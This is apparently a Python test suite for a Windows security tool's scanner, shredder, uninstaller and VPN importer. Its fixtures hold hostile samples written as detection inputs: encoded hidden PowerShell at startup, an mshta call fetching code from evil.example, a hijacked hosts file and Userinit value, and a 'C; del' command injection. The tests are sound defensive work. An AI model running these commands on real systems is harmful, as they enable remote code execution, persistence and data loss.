"""Backend logic tests with Windows stand-ins (runs on Linux/macOS/Windows).

    python tests/test_backend.py
"""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import traceback

sys.path.insert(0, os.path.dirname(__file__))
import fakewin  # noqa: E402  (installs fake winreg + env)
from fakewin import reg_put, PS_RULES, PS_LOG  # noqa: E402

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core import util  # noqa: E402

# ---- route subprocess.run through fakes (PowerShell + other commands)
RUN_RULES = []


def fake_run(args, **kw):
    if isinstance(args, list) and args and str(args[0]).lower().replace("\\", "/").endswith(("powershell", "/powershell.exe")):
        cmd = args[-1]
        out, err, code = fakewin.fake_ps(cmd, kw.get("timeout"))
        return subprocess.CompletedProcess(args, code, out, err)
    joined = " ".join(map(str, args)) if isinstance(args, list) else str(args)
    for sub, resp in RUN_RULES:
        if sub in joined:
            if resp == "TIMEOUT":
                raise subprocess.TimeoutExpired(args, kw.get("timeout"))
            return subprocess.CompletedProcess(args, resp[0], resp[1], "")
    return subprocess.CompletedProcess(args, 0, "", "")


util.subprocess.run = fake_run

from core import system, scanner, privacy, trust, shredder, vpn, identity, themes, autostart, install, updater  # noqa: E402

RESULTS = []
import ntpath, types  # noqa: E401,E402


def winos(**over):
    """An 'os' module whose os.path uses Windows path rules (plus optional overrides)."""
    p = types.SimpleNamespace(**{k: getattr(ntpath, k) for k in dir(ntpath) if not k.startswith("_")})
    for k, v in over.items():
        setattr(p, k, v)
    return types.SimpleNamespace(path=p, environ=os.environ, listdir=os.listdir, walk=os.walk, sep="\\",
                                 getpid=os.getpid, stat=os.stat, lstat=os.lstat)


def test(fn):
    PS_RULES.clear(); RUN_RULES.clear(); PS_LOG.clear()
    try:
        fn()
        RESULTS.append(("PASS", fn.__name__, ""))
    except Exception:
        RESULTS.append(("FAIL", fn.__name__, traceback.format_exc()))
    return fn


# ======================================================================= util
@test
def ps_timeout_does_not_raise():
    real = util.subprocess.run

    def boom(*a, **k):
        raise subprocess.TimeoutExpired(a[0], 5)
    util.subprocess.run = boom
    try:
        out, err, code = util.ps("Update-MpSignature", timeout=5)
        assert code == 124 and "Timed out" in err
        code, out = util.run(["cipher", "/w:C:\\"], timeout=5)
        assert code == 124
    finally:
        util.subprocess.run = real


@test
def ps_json_single_object_becomes_list():
    PS_RULES.append(("Get-Thing", ('{"a":1}', "", 0)))
    assert util.ps_json("Get-Thing") == [{"a": 1}]
    PS_RULES.insert(0, ("Get-Bad", ("not json", "", 0)))
    assert util.ps_json("Get-Bad") == []


@test
def enum_names_numeric_and_text():
    assert util.enum_name(4, util.MEDIA_TYPES) == "SSD"
    assert util.enum_name("3", util.MEDIA_TYPES) == "HDD"
    assert util.enum_name("SSD", util.MEDIA_TYPES) == "SSD"
    assert util.enum_name(0, util.HEALTH) == "Healthy"


# ======================================================================= system
@test
def exe_from_command_cases():
    f = system.exe_from_command
    assert f('"C:\\Program Files\\Discord\\Update.exe" --processStart Discord.exe') == "C:\\Program Files\\Discord\\Update.exe"
    assert f("C:\\Program Files\\Foo\\foo.exe -silent") == "C:\\Program Files\\Foo\\foo.exe"
    assert f("rundll32.exe C:\\x.dll,Run") == "rundll32.exe"


@test
def suspicious_lolbin_args():
    rx = system.SUSPICIOUS_ARGS
    assert rx.search("powershell.exe -w hidden -c iex(...)")
    assert rx.search("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA")
    assert rx.search("mshta.exe https://evil.example/x.hta")
    assert not rx.search('"C:\\Program Files\\Steam\\steam.exe" -silent')
    assert not rx.search("C:\\Windows\\System32\\rundll32.exe shell32.dll,Control_RunDLL")


@test
def startup_entries_and_toggle():
    run = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_put("HKCU", run, "Discord", '"C:\\Users\\ynzer\\AppData\\Local\\Discord\\Update.exe" --processStart Discord.exe', 1)
    reg_put("HKCU", run, "Updater", "C:\\Users\\ynzer\\AppData\\Roaming\\upd\\upd.exe /silent", 1)
    reg_put("HKCU", run, "Evil", "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUA", 1)
    sigs = json.dumps([
        {"Path": "C:\\Users\\ynzer\\AppData\\Local\\Discord\\Update.exe", "Status": "Valid", "Signer": "Discord Inc."},
    ])
    PS_RULES.append(("Get-AuthenticodeSignature", (sigs, "", 0)))
    fake_files = {"C:\\Users\\ynzer\\AppData\\Local\\Discord\\Update.exe", "C:\\Users\\ynzer\\AppData\\Roaming\\upd\\upd.exe",
                  "C:\\Windows\\System32\\powershell.exe"}
    real_os = system.os
    system.os = winos(isfile=lambda p: p in fake_files, exists=lambda p: p in fake_files, isdir=lambda p: False)
    try:
        items = {i["name"]: i for i in system.startup_entries()}
    finally:
        system.os = real_os
    assert items["Discord"]["signature"] == "Valid" and not items["Discord"]["suspicious"]
    assert items["Updater"]["suspicious"], items["Updater"]
    assert items["Evil"]["exe"].lower().endswith("system32\\powershell.exe"), items["Evil"]["exe"]
    assert items["Evil"]["suspicious"], "encoded hidden PowerShell at startup must be flagged"
    assert items["Evil"]["signature"] != "Missing"
    # toggle off/on uses Task Manager's StartupApproved flag
    system.set_startup(items["Updater"]["id"], False)
    assert not system._approved("HKCU", "Run", "Updater")
    system.set_startup(items["Updater"]["id"], True)
    assert system._approved("HKCU", "Run", "Updater")


@test
def diagnostics_numeric_disk_enums():
    # PowerShell 5.1 can serialize Get-PhysicalDisk enums as numbers
    PS_RULES.append(("Get-Partition -DriveLetter C", ("0", "", 0)))
    PS_RULES.append(("Get-PhysicalDisk", (json.dumps([
        {"DeviceId": "0", "FriendlyName": "ST1000DM010", "Size": 1e12, "MediaType": "3", "BusType": "11", "HealthStatus": "0"},
        {"DeviceId": "1", "FriendlyName": "Samsung 970", "Size": 5e11, "MediaType": "4", "BusType": "17", "HealthStatus": "0"}]), "", 0)))
    PS_RULES.append(("Win32_PhysicalMemory", (json.dumps([{"Capacity": 8 * 1024**3, "Speed": 3200, "ConfiguredClockSpeed": 2133}] * 2), "", 0)))
    real = shutil.disk_usage
    system.shutil.disk_usage = lambda p: real("/")
    try:
        d = system.diagnostics()
    finally:
        system.shutil.disk_usage = real
    titles = [f["title"] for f in d["flags"]]
    assert "Windows is on a hard drive (HDD)" in titles, titles
    assert not any(t.startswith("Disk health") for t in titles), "healthy disks must not raise a health alarm"
    assert "RAM below rated speed" in titles
    disk_line = dict(d["info"])["Disk 0 (Windows)"]
    assert "HDD" in disk_line and "SATA" in disk_line and "Healthy" in disk_line, disk_line


@test
def appx_uninstall_reports_failure():
    PS_RULES.append(("Remove-AppxPackage", ("ERR: Removal failed. Please contact your software vendor.", "", 0)))
    r = system.uninstall("appx", "king.com.CandyCrushSaga_1.0_x64__kgqvnymyfvs32")
    assert r["ok"] is False and "Removal failed" in r["message"], r


@test
def msi_uninstall_string_converted():
    hk = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{ABC}"
    reg_put("HKLM", hk, "DisplayName", "McAfee LiveSafe", 1)
    reg_put("HKLM", hk, "UninstallString", "MsiExec.exe /I {ABC}", 1)
    seen = {}

    class P:
        def __init__(self, cmd, **kw):
            seen["cmd"], seen["kw"] = cmd, kw

        def wait(self, timeout=None):
            return 0
    real = system.subprocess.Popen
    system.subprocess.Popen = P
    try:
        r = system.uninstall("win32", "{ABC}")
    finally:
        system.subprocess.Popen = real
    assert "/X{ABC}" in seen["cmd"], seen["cmd"]
    assert seen["kw"].get("creationflags") == util.CREATE_NO_WINDOW
    assert r["ok"]


@test
def bloat_rules():
    assert system.match_bloat("McAfee LiveSafe", "McAfee, LLC")["level"] == "pup"
    assert system.match_bloat("ARMOURY CRATE Service", "ASUS")["level"] == "optional"
    assert system.match_bloat("Steam", "Valve") is None


# ======================================================================= scanner
@test
def clean_resources_and_threat_files():
    assert scanner._clean_resource("file:_C:\\x\\evil.exe") == "C:\\x\\evil.exe"
    assert scanner._clean_resource("containerfile:_C:\\a.zip->(Zip)b.exe") == "C:\\a.zip->(Zip)b.exe"
    det = {"location": "C:\\gone\\a.exe; C:\\a.zip->(Zip)b.exe; pid:4,ProcessStart:1"}
    files = scanner._threat_files(det, must_exist=False)
    assert files == ["C:\\gone\\a.exe", "C:\\a.zip"], files


@test
def defender_detection_parsing():
    rows = [
        {"ThreatID": "2147", "Name": "Trojan:Win32/Wacatac.B!ml", "Severity": 5, "Status": 1, "When": "2026-11-18T10:00:00Z",
         "Epoch": 2000000000, "Files": "file:_C:\\Users\\k\\Downloads\\x.exe; containerfile:_C:\\a.zip->(Zip)b.exe"},
        {"ThreatID": "2147", "Name": "Trojan:Win32/Wacatac.B!ml", "Severity": 5, "Status": 3, "When": "2020-01-01T00:00:00Z",
         "Epoch": 100, "Files": "file:_C:\\old.exe"},
        {"ThreatID": "99", "Name": "PUA:Win32/Old", "Severity": 1, "Status": 3, "When": "2020", "Epoch": 100, "Files": ""},
    ]
    PS_RULES.append(("Get-MpThreatDetection", (json.dumps(rows), "", 0)))
    out = scanner.defender_detections(since_epoch=1999999000)
    assert len(out) == 1, out  # old resolved one filtered, duplicates collapsed to newest
    d = out[0]
    assert d["id"] == "threat|2147" and d["severity"] == "Severe" and not d["resolved"]
    assert "containerC:" not in d["location"] and "C:\\a.zip->(Zip)b.exe" in d["location"], d["location"]


@test
def hosts_check():
    tmp = tempfile.NamedTemporaryFile("w", delete=False, suffix="hosts")
    tmp.write("127.0.0.1 localhost\n0.0.0.0 ads.example.com reset.example.com\n0.0.0.0 x.com www.malwarebytes.com\n"
              "6.6.6.6 www.paypal.com\n0.0.0.0 telemetry.microsoft.com # privacy blocklist\n")
    tmp.close()
    old = scanner.HOSTS
    scanner.HOSTS = tmp.name
    try:
        found = [f for f in scanner.check_pums() if f["id"] == "pum|hosts"]
    finally:
        scanner.HOSTS = old
    assert found, "expected hosts finding"
    loc = found[0]["location"]
    assert "www.malwarebytes.com" in loc, "second hostname on a line must be checked"
    assert "www.paypal.com -> 6.6.6.6" in loc
    assert "reset.example.com" not in loc, "'eset' inside 'reset' must not count"
    assert "telemetry.microsoft.com" not in loc, "blocking (0.0.0.0) a non-security MS domain is a privacy list, not malware"


@test
def userinit_and_shell_rules():
    scanner.USERINIT = ntpath.expandvars(r"%SystemRoot%\system32\userinit.exe")
    w = scanner.WINLOGON
    reg_put("HKLM", w, "Userinit", "C:\\Windows\\system32\\userinit.exe,", 1)
    reg_put("HKLM", w, "Shell", "explorer.exe", 1)
    ids = {f["id"] for f in scanner.check_pums()}
    assert not any("Userinit" in i or "|Shell" in i for i in ids), ids
    reg_put("HKLM", w, "Userinit", "C:\\Windows\\system32\\userinit.exe,C:\\Users\\Public\\x.exe,", 1)
    ids = {f["id"] for f in scanner.check_pums()}
    assert any("Userinit" in i for i in ids)
    reg_put("HKLM", w, "Userinit", "C:\\Windows\\system32\\userinit.exe,", 1)


@test
def defender_exclusion_trusted_publisher_skipped():
    PS_RULES.append(("Get-MpPreference | Select-Object ExclusionPath", (json.dumps(
        {"ExclusionPath": "C:\\Program Files\\Riot Vanguard", "ExclusionProcess": ["vgc.exe"], "ExclusionExtension": None}), "", 0)))
    calls = []

    def fake_identify(v, kind="Path"):
        calls.append((v, kind))
        return ("Valid", "Riot Games, Inc.")
    real = trust.identify
    trust.identify = fake_identify
    try:
        found = [f for f in scanner.check_pums() if "defex" in f["id"]]
    finally:
        trust.identify = real
    assert ("C:\\Program Files\\Riot Vanguard", "Path") in calls, "single string exclusion must be handled"
    assert not found, found


@test
def defender_exclusion_unknown_flagged():
    PS_RULES.append(("Get-MpPreference | Select-Object ExclusionPath", (json.dumps(
        {"ExclusionPath": ["C:\\ProgramData\\svch"], "ExclusionProcess": None, "ExclusionExtension": [".exe"]}), "", 0)))
    real = trust.identify
    trust.identify = lambda v, kind="Path": ("Unknown", "")
    try:
        found = [f for f in scanner.check_pums() if "defex" in f["id"]]
    finally:
        trust.identify = real
    assert len(found) == 2, found


@test
def review_mode_detects_tamper_protection():
    state = {"vals": {"LowThreatDefaultAction": 0, "ModerateThreatDefaultAction": 0, "HighThreatDefaultAction": 0,
                      "SevereThreatDefaultAction": 0}}
    PS_RULES.append(("ThreatDefaultAction | ConvertTo-Json", lambda c: (json.dumps(state["vals"]), "", 0)))
    PS_RULES.append(("Get-MpPreference | Select-Object LowThreatDefaultAction", lambda c: (json.dumps(state["vals"]), "", 0)))
    PS_RULES.append(("Set-MpPreference", ("", "", 0)))  # 'succeeds' but Tamper Protection ignores it
    util.save_setting("defender_hold", None)
    held = scanner._hold_defender_actions("all")
    assert held and held["ok"] is False and "Tamper" in held["err"], held
    scanner._restore_defender_actions(held)
    assert util.load_settings().get("defender_hold") is None
    # when it does apply, ok is True
    PS_RULES.insert(0, ("Set-MpPreference -Low", lambda c: (state["vals"].update({k: 9 for k in state["vals"]}) or "", "", 0)))
    held = scanner._hold_defender_actions("all")
    assert held["ok"], held
    # a second hold while one is active must NOT capture NoAction as the 'previous' value
    assert scanner._hold_defender_actions("all") is None
    scanner._restore_defender_actions(held)
    assert any("Remove-MpPreference -LowThreatDefaultAction" in c for c in PS_LOG)


@test
def quarantine_never_uses_remove_mpthreat():
    det = {"id": "threat|5", "category": "threat", "name": "X", "location": "C:\\gone.exe",
           "fix": {"action": "remove_threat", "threat_id": "5"}}
    PS_RULES.append(("Get-MpThreat | Where-Object", ("", "", 0)))
    PS_RULES.append(("ThreatDefaultAction", ('{"LowThreatDefaultAction":9,"ModerateThreatDefaultAction":9,'
                                             '"HighThreatDefaultAction":9,"SevereThreatDefaultAction":9}', "", 0)))
    util.save_setting("defender_hold", None)
    r = scanner._quarantine_threat(det)
    assert r["ok"], r
    assert not any(c.strip().endswith("Remove-MpThreat") or "Remove-MpThreat" in c for c in PS_LOG), PS_LOG
    assert any("-ThreatIDDefaultAction_Ids 5 -ThreatIDDefaultAction_Actions Quarantine" in c for c in PS_LOG)
    assert any("Start-MpScan -ScanType QuickScan" in c for c in PS_LOG)


@test
def apply_actions_flow():
    rep = {"id": "t-apply", "kind": "quick", "detections": [
        {"id": "pup|X", "category": "pup", "name": "X", "state": "found", "fix": {"action": "uninstall", "kind": "win32", "ident": "nope"}},
        {"id": "pum|Y", "category": "pum", "name": "Y", "state": "found", "signer": "Riot Games, Inc.", "sig_status": "Valid",
         "fix": {"hive": "HKCU", "path": "Software\\Test", "name": "V", "action": "delete"}},
        {"id": "pum|Z", "category": "pum", "name": "Z", "state": "found",
         "fix": {"hive": "HKLM", "path": "SOFTWARE\\T", "name": "EnableLUA", "action": ["set", 1]}},
        {"id": "startup|S", "category": "startup", "name": "S", "state": "found", "fix": {"action": "disable_startup", "ident": "HKCU|Run|S"}},
    ]}
    rep["summary"] = scanner.summarize(rep)
    scanner.save_report(rep)
    reg_put("HKLM", "SOFTWARE\\T", "EnableLUA", 0)
    res = scanner.apply_actions("t-apply", [{"id": "pup|X", "action": "skip"}, {"id": "pum|Y", "action": "trust"},
                                            {"id": "pum|Z", "action": "fix"}, {"id": "startup|S", "action": "exclude"}])
    st = {d["id"]: d["state"] for d in res["report"]["detections"]}
    assert st == {"pup|X": "skipped", "pum|Y": "trusted", "pum|Z": "fixed", "startup|S": "ignored"}, st
    assert util.reg_get("HKLM", "SOFTWARE\\T", "EnableLUA") == 1
    assert "Riot Games" in trust.trusted_list()
    assert "startup|S" in scanner.ignored()
    s = res["report"]["summary"]
    assert s["skipped"] == 1 and s["ignored"] == 2 and s["fixed"] == 1 and s["open"] == 0, s
    scanner.remove_exclusion("startup|S")
    assert "startup|S" not in scanner.ignored()
    scanner.delete_report("t-apply")


@test
def start_scan_marks_running_immediately_and_cancel_resets():
    real = scanner._run_scan
    scanner._run_scan = lambda *a: time.sleep(0.3)
    try:
        with scanner._state_lock:
            scanner.STATE.update(running=False, report_id="OLD", cancel=True)
        r = scanner.start_scan("quick")
        s = scanner.scan_state()
        assert r["ok"] and s["running"] and s["report_id"] is None and s["cancel"] is False, s
        assert scanner.start_scan("quick")["ok"] is False
        assert scanner.start_scan("custom", "/definitely/not/here")["ok"] is False
    finally:
        time.sleep(0.4)
        scanner._run_scan = real
        with scanner._state_lock:
            scanner.STATE["running"] = False


@test
def scan_lock_blocks_second_process():
    lock = scanner.LOCK_FILE
    import psutil
    parent = psutil.Process(os.getppid())
    with open(lock, "w") as f:
        json.dump({"pid": parent.pid, "ctime": parent.create_time(), "kind": "deep", "started": time.time() - 60}, f)
    try:
        assert scanner.other_scan()
        r = scanner.start_scan("quick")
        assert r["ok"] is False and "scheduled" in r["message"], r
        assert scanner.scan_state().get("background", {}).get("kind") == "deep"
    finally:
        os.remove(lock)
    assert scanner.other_scan() is None


@test
def full_scan_run_produces_report():
    PS_RULES.append(("Get-MpThreatDetection", ("[]", "", 0)))
    PS_RULES.append(("ThreatDefaultAction", ('{"LowThreatDefaultAction":9,"ModerateThreatDefaultAction":9,'
                                             '"HighThreatDefaultAction":9,"SevereThreatDefaultAction":9}', "", 0)))
    PS_RULES.append(("Update-MpSignature", ("", "Timed out after 300 s", 124)))  # offline: must not abort the scan
    util.save_setting("defender_hold", None)
    rep = scanner._run_scan("quick")
    assert rep["id"] and os.path.exists(os.path.join(util.REPORT_DIR, rep["id"] + ".json"))
    assert scanner.scan_state()["running"] is False and scanner.scan_state()["report_id"] == rep["id"]
    assert util.load_settings().get("defender_hold") is None, "Defender must be put back after the scan"
    assert not os.path.exists(scanner.LOCK_FILE)
    scanner.delete_report(rep["id"])


@test
def schedule_validation_and_command():
    PS_RULES.append(("Register-ScheduledTask", ("ok", "", 0)))
    assert scanner.set_schedule("quick", True, "weekly", "WED", "")["ok"] is False
    r = scanner.set_schedule("deep", True, "weekly", "SUN", "03:00")
    assert r["ok"], r
    cmd = [c for c in PS_LOG if "Register-ScheduledTask" in c][-1]
    assert "-StartWhenAvailable" in cmd and "-AllowStartIfOnBatteries" in cmd and "-DaysOfWeek Sunday" in cmd
    assert "--scan deep" in cmd


# ======================================================================= shredder
def _shredder_blocks_ancestors():
    assert shredder._blocked("C:\\") == "a whole drive"
    assert shredder._blocked("C:\\Users") is not None, "C:\\Users contains every profile"
    assert shredder._blocked("C:\\Users\\ynzer\\Documents") is not None
    assert shredder._blocked("C:\\Windows\\System32\\x.dll") is not None



@test
def shredder_blocks_ancestors():
    real_os = shredder.os
    shredder.os = winos()
    shredder.BLOCKED = [ntpath.normcase(ntpath.expandvars(p)).rstrip("\\") for p in (
        r"%SystemRoot%", r"%ProgramFiles%", r"%ProgramFiles(x86)%", r"%ProgramData%", r"%PUBLIC%",
        r"%USERPROFILE%", r"%USERPROFILE%\Desktop", r"%USERPROFILE%\Documents") if "%" not in ntpath.expandvars(p)]
    try:
        _shredder_blocks_ancestors()
    finally:
        shredder.os = real_os


@test
def shredder_does_not_follow_links():
    base = tempfile.mkdtemp()
    outside = os.path.join(base, "outside"); os.makedirs(outside)
    precious = os.path.join(outside, "precious.txt")
    open(precious, "w").write("keep me")
    victim = os.path.join(base, "victim"); os.makedirs(os.path.join(victim, "sub"))
    open(os.path.join(victim, "a.txt"), "w").write("secret" * 1000)
    open(os.path.join(victim, "sub", "b.txt"), "w").write("secret2")
    os.symlink(outside, os.path.join(victim, "link_to_outside"))          # directory link
    os.symlink(precious, os.path.join(victim, "file_link.txt"))          # file link
    hard = os.path.join(victim, "hard.txt"); os.link(precious, hard)     # hard link to precious
    real_blocked = shredder._blocked
    shredder._blocked = lambda p: None
    real_media = shredder.drive_media
    shredder.drive_media = lambda p: "SSD"
    try:
        info = shredder.inspect([victim])[0]
        assert info["files"] == 3, info  # a.txt, b.txt, hard.txt - nothing behind links
        shredder._worker([victim], 1, False)
        st = shredder.state()
    finally:
        shredder._blocked, shredder.drive_media = real_blocked, real_media
    assert open(precious).read() == "keep me", "a link target outside the folder was destroyed!"
    assert not os.path.exists(os.path.join(victim, "a.txt"))
    assert os.path.exists(hard) and st["errors"], "hard-linked file must be skipped and reported"
    shutil.rmtree(base)


@test
def shredder_overwrites_then_deletes():
    d = tempfile.mkdtemp()
    p = os.path.join(d, "s.bin")
    open(p, "wb").write(b"A" * 3_000_000)
    writes = []
    real_open = open

    class Spy:
        def __init__(self, f): self.f = f
        def __enter__(self): return self
        def __exit__(self, *a): self.f.close()
        def write(self, b): writes.append(bytes(b[:4])); return self.f.write(b)
        def __getattr__(self, n): return getattr(self.f, n)
    import builtins
    builtins.open = lambda path, mode="r", *a, **k: Spy(real_open(path, mode, *a, **k)) if path == p and "r+b" in mode else real_open(path, mode, *a, **k)
    try:
        shredder._shred_file(p, 3)
    finally:
        builtins.open = real_open
    assert not os.path.exists(p) and os.listdir(d) == []
    assert len(writes) == 9 and writes[-1] == b"\x00" * 4, writes  # 3 MB x 3 passes, last pass zeros
    shutil.rmtree(d)


@test
def drive_list_one_call_and_no_empty_readers():
    import collections
    shredder._MEDIA["at"] = 0
    PS_RULES.append(("Get-Partition | Where-Object DriveLetter", (json.dumps(
        [{"L": "C", "M": "4"}, {"L": "D", "M": "HDD"}, {"L": "E", "M": ""}]), "", 0)))
    P = collections.namedtuple("P", "device mountpoint fstype opts")
    parts = [P("C:\\", "C:\\", "NTFS", "rw,fixed"), P("D:\\", "D:\\", "NTFS", "rw,fixed"),
             P("F:\\", "F:\\", "", "removable"), P("G:\\", "G:\\", "CDFS", "ro,cdrom")]
    import psutil
    real = psutil.disk_partitions
    psutil.disk_partitions = lambda all=False: parts
    try:
        d = shredder.drives()
        n_calls = sum("Get-Partition" in c for c in PS_LOG)
        assert shredder.drive_media("C:\\x") in ("SSD", "Unknown")
    finally:
        psutil.disk_partitions = real
    assert d == [{"letter": "C", "media": "SSD"}, {"letter": "D", "media": "HDD"}], d   # empty reader + DVD skipped
    assert n_calls == 1, n_calls


@test
def reports_are_capped():
    for i in range(scanner.MAX_REPORTS + 5):
        scanner.save_report({"id": f"20200101-{i:06d}-x", "kind": "quick", "detections": [], "summary": {}})
    assert len(scanner.list_reports()) == scanner.MAX_REPORTS
    for r in scanner.list_reports():
        scanner.delete_report(r["id"])


@test
def wipe_letter_validated():
    assert shredder.wipe_free_space("C; del")["ok"] is False


# ======================================================================= trust / privacy / vpn / identity
@test
def trust_publisher_matching():
    trust.reset()
    assert trust.is_trusted("Riot Games, Inc.", "Valid")
    assert not trust.is_trusted("Riot Games, Inc.", "NotSigned")
    assert not trust.is_trusted("Totally Not Riot Games", "Valid")


@test
def privacy_toggles_roundtrip():
    privacy.set_all(False)
    assert all(not t["allowed"] for t in privacy.get_toggles())
    privacy.set_toggle("websearch", True)
    t = {x["id"]: x for x in privacy.get_toggles()}
    assert t["websearch"]["allowed"] and not t["adid"]["allowed"]
    assert util.reg_get("HKCU", r"Software\Policies\Microsoft\Windows\Explorer", "DisableSearchBoxSuggestions") is None


@test
def remote_tools_whole_word():
    hk = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    reg_put("HKLM", hk + r"\coll", "DisplayName", "Collateral Damage Toolkit", 1)
    reg_put("HKLM", hk + r"\ad", "DisplayName", "AnyDesk", 1)
    names = [t["name"] for t in privacy.remote_access()["tools"]]
    assert "AnyDesk" in names and not any("Collateral" in n for n in names), names


@test
def vpn_default_falls_back():
    for f in os.listdir(util.VPN_DIR):
        os.remove(os.path.join(util.VPN_DIR, f))
    src = os.path.join(tempfile.mkdtemp(), "proton US#FREE 12!.conf")
    open(src, "w").write("[Interface]\nPrivateKey = x\n[Peer]\nEndpoint = 1.2.3.4:51820\n")
    r = vpn.import_config(src)
    assert r["ok"] and r["name"] == "proton-US-FREE-12", r
    util.save_setting("vpn_default", "deleted-tunnel")
    st = vpn.status()
    assert st["default"] == "proton-US-FREE-12", st
    bad = os.path.join(tempfile.mkdtemp(), "x.conf"); open(bad, "w").write("hello")
    assert vpn.import_config(bad)["ok"] is False


@test
def identity_parsing():
    body = json.dumps({"ExposedBreaches": {"breaches_details": [
        {"breach": "Canva", "domain": "canva.com", "xposed_date": "2019", "xposed_records": 137272116,
         "xposed_data": "Email addresses;Names;Passwords", "password_risk": "hardtocrack"}]},
        "BreachMetrics": {"risk": [{"risk_label": "Low", "risk_score": 2}]}})
    real = identity._get
    identity._get = lambda url, timeout=20: (200, body)
    try:
        r = identity.check_email(" kara@example.com ")
    finally:
        identity._get = real
    assert r["ok"] and r["count"] == 1 and "Passwords" in r["exposed_types"] and r["risk_label"] == "Low", r
    identity._get = lambda url, timeout=20: (404, '{"Error":"Not found"}')
    try:
        assert identity.check_email("clean@example.com")["count"] == 0
    finally:
        identity._get = real
    import hashlib
    h = hashlib.sha1(b"password").hexdigest().upper()
    identity._get = lambda url, timeout=20: (200, f"0000000000000000000000000000000000A:1\r\n{h[5:]}:9545824\r\n")
    try:
        assert identity.check_password("password")["count"] == 9545824
    finally:
        identity._get = real
    assert identity.check_email("not-an-email")["ok"] is False


@test
def autostart_task_priority():
    PS_RULES.append(("Register-ScheduledTask", ("ok", "", 0)))
    assert autostart.set_enabled(True)["ok"]
    cmd = [c for c in PS_LOG if "Register-ScheduledTask" in c][-1]
    assert "-Priority 4" in cmd and "--startup" in cmd


@test
def json_serializable_api_payloads():
    # pywebview json.dumps()es every return value
    json.dumps(scanner.scan_state()); json.dumps(privacy.get_toggles()); json.dumps(trust.trusted_list())
    json.dumps(themes.THEMES); json.dumps(vpn.status())



# ---------------------------------------------------------------- 1.3: security + updates
@test
def machine_wide_uninstall_uses_full_cmd_path_not_shell():
    hk = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Bloat1"
    reg_put("HKLM", hk, "DisplayName", "Bloat One", 1)
    reg_put("HKLM", hk, "UninstallString", '"C:\\Program Files\\Bloat\\unins000.exe" /SILENT', 1)
    seen = {}

    class P:
        def __init__(self, cmd, **kw):
            seen["cmd"], seen["kw"] = cmd, kw

        def wait(self, timeout=None):
            return 0
    real = system.subprocess.Popen
    system.subprocess.Popen = P
    try:
        system.uninstall("win32", "Bloat1")
    finally:
        system.subprocess.Popen = real
    assert "shell" not in seen["kw"], seen["kw"]
    assert seen["cmd"].startswith('"' + util.sys_exe("cmd") + '" /d /s /c '), seen["cmd"]


@test
def per_user_uninstaller_runs_without_admin():
    hk = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WaveBrowser"
    reg_put("HKCU", hk, "DisplayName", "Wave Browser", 1)
    reg_put("HKCU", hk, "UninstallString", '"C:\\Users\\ynzer\\AppData\\Local\\Wave\\uninstall.exe" --force', 1)
    prog = next(p for p in system.installed_programs() if p["name"] == "Wave Browser")
    assert prog["per_user"] and prog["id"] == "HKCU\\WaveBrowser", prog
    PS_RULES.append(("Register-ScheduledTask", ("ok", "", 0)))
    popen = system.subprocess.Popen
    system.subprocess.Popen = lambda *a, **k: (_ for _ in ()).throw(AssertionError("ran with admin rights"))
    try:
        system.uninstall("win32", "WaveBrowser")  # 1.2 reports stored the bare key name
    finally:
        system.subprocess.Popen = popen
    cmd = [c for c in PS_LOG if "Register-ScheduledTask" in c][-1]
    assert "-RunLevel Limited" in cmd and "Highest" not in cmd, cmd
    assert "uninstall.exe" in cmd and "Unregister-ScheduledTask" in cmd


@test
def same_key_name_in_hkcu_cannot_stand_in_for_machine_program():
    reg_put("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Shared", "DisplayName", "Real App", 1)
    reg_put("HKLM", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Shared", "UninstallString", "real.exe", 1)
    reg_put("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Shared", "DisplayName", "Fake App", 1)
    reg_put("HKCU", r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Shared", "UninstallString", "evil.exe", 1)
    ids = {p["name"]: p["id"] for p in system.installed_programs()}
    assert ids["Real App"] == "Shared" and ids["Fake App"] == "HKCU\\Shared"


@test
def windows_tools_run_by_full_path():
    seen = []
    real = util.subprocess.run
    util.subprocess.run = lambda args, **kw: seen.append(args) or subprocess.CompletedProcess(args, 0, "", "")
    try:
        util.run(["icacls", "x"]); util.run(["cipher", "/w:C:\\"]); util.ps("Get-Date")
    finally:
        util.subprocess.run = real
    assert seen[0][0] == os.path.join(util.SYSTEM32, "icacls.exe") and seen[1][0].endswith("cipher.exe")
    assert seen[2][0] == util.POWERSHELL and os.path.dirname(seen[2][0])
    assert util.sys_exe("C:\\x\\wireguard.exe") == "C:\\x\\wireguard.exe"


@test
def wireguard_only_from_program_files():
    assert vpn.WG_EXE_CANDIDATES == [os.path.join(util.PROGRAM_FILES, "WireGuard", "wireguard.exe")]
    assert vpn.wireguard_exe() is None  # no PATH lookup fallback


@test
def vpn_import_strips_scripts_and_locks_key():
    d = tempfile.mkdtemp()
    src = os.path.join(d, "proton US#1.conf")
    open(src, "w").write("[Interface]\nPrivateKey = abc\nPostUp = calc.exe\nPreUp=whoami\n[Peer]\nEndpoint = 1.2.3.4:51820\n")
    RUN_RULES.append(("icacls", (0, "")))
    seen = []
    real = vpn.run
    vpn.run = lambda cmd, **kw: seen.append(cmd) or (0, "")
    try:
        r = vpn.import_config(src)
    finally:
        vpn.run = real
    text = open(os.path.join(util.VPN_DIR, r["name"] + ".conf")).read()
    assert "PostUp" not in text and "PreUp" not in text and "PrivateKey" in text and "Endpoint" in text
    assert seen and "*S-1-5-18:F" in seen[0] and "*S-1-5-32-544:F" in seen[0] and not any("USERNAME" in str(x) for x in seen[0])
    os.remove(os.path.join(util.VPN_DIR, r["name"] + ".conf"))
    shutil.rmtree(d)


@test
def trusted_publisher_needs_whole_name():
    assert trust.is_trusted("Riot Games, Inc.", "Valid")
